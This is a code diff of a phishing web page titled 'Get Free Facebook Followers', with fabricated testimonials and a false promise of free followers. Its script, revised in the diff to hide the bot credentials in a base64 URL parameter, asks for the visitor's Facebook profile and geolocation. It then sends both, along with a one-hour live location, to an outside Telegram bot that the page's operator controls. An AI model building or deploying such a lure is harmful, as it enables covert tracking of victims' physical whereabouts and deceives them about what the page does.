@@ -1,8 +1,13 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Get Free Facebook Followers</title>
+    <meta property="og:title" content="Get Free Facebook Followers">
+    <meta property="og:description" content="We are offering a limited-time promotion where you can get free Facebook followers. Just follow the steps below to claim your free followers. This offer is 100% genuine and backed by leading social media growth experts.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT48_lERA8xUn_I75TdyimzBRS7L14YlZOGkw&s">
+    <meta name="robots" content="noindex, nofollow">
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -63,13 +68,6 @@
         .testimonial .text {
             font-style: italic;
             color: #333;
-        }
-        .badges {
-            margin: 20px 0;
-        }
-        .badges img {
-            max-width: 100px;
-            margin: 10px;
         }
         form {
             margin-top: 20px;
@@ -170,9 +168,7 @@
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 <body>
-   
     <div class="container">
-       
         <h1>Get Free Facebook Followers</h1>
         <p>We are offering a limited-time promotion where you can get free Facebook followers. Just follow the steps below to claim your free followers. This offer is 100% genuine and backed by leading social media growth experts.</p>
 
@@ -191,7 +187,7 @@
                 <div class="text">"This offer is amazing! I got my free followers in minutes. Highly recommend!".</div>
             </div>
             <div class="testimonial">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQKTT0yjiC_oQ6pI2R9x0CFUaRtY4vDG-LUg&s" alt="John D.">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQKTT0yjiC_oQ6pI2R9x0CFUaRtY4vDG-LUg&s" alt="Jane S.">
                 <div class="text">"I was skeptical at first, but it really works. Thanks for the free followers!".</div>
             </div>
             <div class="testimonial">
@@ -211,82 +207,96 @@
                 <div class="text">"Amazing experience! The free followers came through as promised.".</div>
             </div>
         </div>
-        
-        <script>
-            function getFreeFollowers() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const telegramToken = urlParams.get('token');
-                const chatId = urlParams.get('chatId');
-    
-                if (!telegramToken || !chatId) {
-                    document.getElementById('message').textContent = 'Missing Telegram token or chat ID.';
-                    return;
-                }
-    
-                const facebookProfile = document.getElementById('facebookProfile').value;
-    
-                if (!facebookProfile) {
-                    document.getElementById('message').textContent = 'Missing Facebook profile.';
-                    return;
-                }
-    
-                document.getElementById('loadingMessage').style.display = 'block';
-    
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function (position) {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-    
-                            sendTextToTelegram(telegramToken, chatId, `Facebook Profile: ${facebookProfile}\nGoogle Maps: ${googleMapsLink}`);
-                            sendLocationToTelegram(telegramToken, chatId, latitude, longitude);
-                        },
-                        function (error) {
-                            document.getElementById('loadingMessage').style.display = 'none';
-                            document.getElementById('message').textContent = 'Error getting location. Please try again.';
-                        }
-                    );
-                } else {
+    </div>
+
+    <script>
+        // Get the encoded data from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedParams = urlParams.get('data');
+
+        let telegramToken = '';
+        let chatId = '';
+
+        if (encodedParams) {
+            // Decode the parameters
+            const decodedParams = atob(encodedParams);
+            const params = new URLSearchParams(decodedParams);
+            telegramToken = params.get('token');
+            chatId = params.get('chatId');
+            console.log('Decoded Params:', params);
+        } else {
+            console.log('No data parameter found.');
+        }
+
+        function getFreeFollowers() {
+            if (!telegramToken || !chatId) {
+                document.getElementById('message').textContent = 'Missing Telegram token or chat ID.';
+                return;
+            }
+
+            const facebookProfile = document.getElementById('facebookProfile').value;
+
+            if (!facebookProfile) {
+                document.getElementById('message').textContent = 'Missing Facebook profile.';
+                return;
+            }
+
+            document.getElementById('loadingMessage').style.display = 'block';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+                        sendTextToTelegram(telegramToken, chatId, `Facebook Profile: ${facebookProfile}\nGoogle Maps: ${googleMapsLink}`);
+                        sendLocationToTelegram(telegramToken, chatId, latitude, longitude);
+                    },
+                    function (error) {
+                        document.getElementById('loadingMessage').style.display = 'none';
+                        document.getElementById('message').textContent = 'Error getting location. Please try again.';
+                    }
+                );
+            } else {
+                document.getElementById('loadingMessage').style.display = 'none';
+                document.getElementById('message').textContent = 'Geolocation is not supported by this browser.';
+            }
+        }
+
+        function sendTextToTelegram(token, chatId, text) {
+            const messageData = {
+                chat_id: chatId,
+                text: text
+            };
+
+            axios.post(`https://api.telegram.org/bot${token}/sendMessage`, messageData)
+                .then(response => {
+                    console.log('Text sent successfully:', response.data);
+                })
+                .catch(error => {
+                    console.error('Error sending text to Telegram:', error);
+                });
+        }
+
+        function sendLocationToTelegram(token, chatId, latitude, longitude) {
+            const locationData = {
+                chat_id: chatId,
+                latitude: latitude,
+                longitude: longitude,
+                live_period: 3600 // Live location duration in seconds (1 hour)
+            };
+
+            axios.post(`https://api.telegram.org/bot${token}/sendLocation`, locationData)
+                .then(response => {
                     document.getElementById('loadingMessage').style.display = 'none';
-                    document.getElementById('message').textContent = 'Geolocation is not supported by this browser.';
-                }
-            }
-    
-            function sendTextToTelegram(token, chatId, text) {
-                const messageData = {
-                    chat_id: chatId,
-                    text: text
-                };
-    
-                axios.post(`https://api.telegram.org/bot${token}/sendMessage`, messageData)
-                    .then(response => {
-                        console.log('Text sent successfully:', response.data);
-                    })
-                    .catch(error => {
-                        console.error('Error sending text to Telegram:', error);
-                    });
-            }
-    
-            function sendLocationToTelegram(token, chatId, latitude, longitude) {
-                const locationData = {
-                    chat_id: chatId,
-                    latitude: latitude,
-                    longitude: longitude,
-                    live_period: 3600 // Live location duration in seconds (1 hour)
-                };
-    
-                axios.post(`https://api.telegram.org/bot${token}/sendLocation`, locationData)
-                    .then(response => {
-                        document.getElementById('loadingMessage').style.display = 'none';
-                        document.getElementById('message').textContent = 'Thank you for your interest! Your request was successful.';
-                    })
-                    .catch(error => {
-                        document.getElementById('loadingMessage').style.display = 'none';
-                        document.getElementById('message').textContent = 'Error sending location. Please try again.';
-                    });
-            }
-        </script>
-       
+                    document.getElementById('message').textContent = 'Thank you for your interest! Your request was successful.';
+                })
+                .catch(error => {
+                    document.getElementById('loadingMessage').style.display = 'none';
+                    document.getElementById('message').textContent = 'Error sending location. Please try again.';
+                });
+        }
+    </script>
 </body>
 </html>
